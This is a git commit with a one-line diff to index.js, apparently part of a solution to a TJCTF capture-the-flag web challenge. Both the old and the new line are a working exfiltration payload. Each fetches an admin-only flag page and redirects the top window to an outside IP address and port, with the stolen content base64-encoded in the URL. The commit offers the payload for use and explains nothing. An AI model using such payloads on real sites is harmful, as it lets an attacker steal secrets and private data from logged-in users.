0b8edadd7a670415ea60c017c3096d94012c89cd
as3617 <46442697+as3617@users.noreply.github.com>
2020-05-26 01:14:59 +0900

    Update index.js

--- index.js
+++ index.js
@@ -1,1 +1,1 @@
-fetch("/admin_flag").then(x=>x.text()).then(x=>top.location.replace("http://198.13.38.185:4000/?"+btoa(x)))
+fetch("https://admin_secrets.tjctf.org/admin_flag").then(x=>x.text()).then(x=>top.location.replace("http://198.13.38.185:4000/?"+btoa(x)))
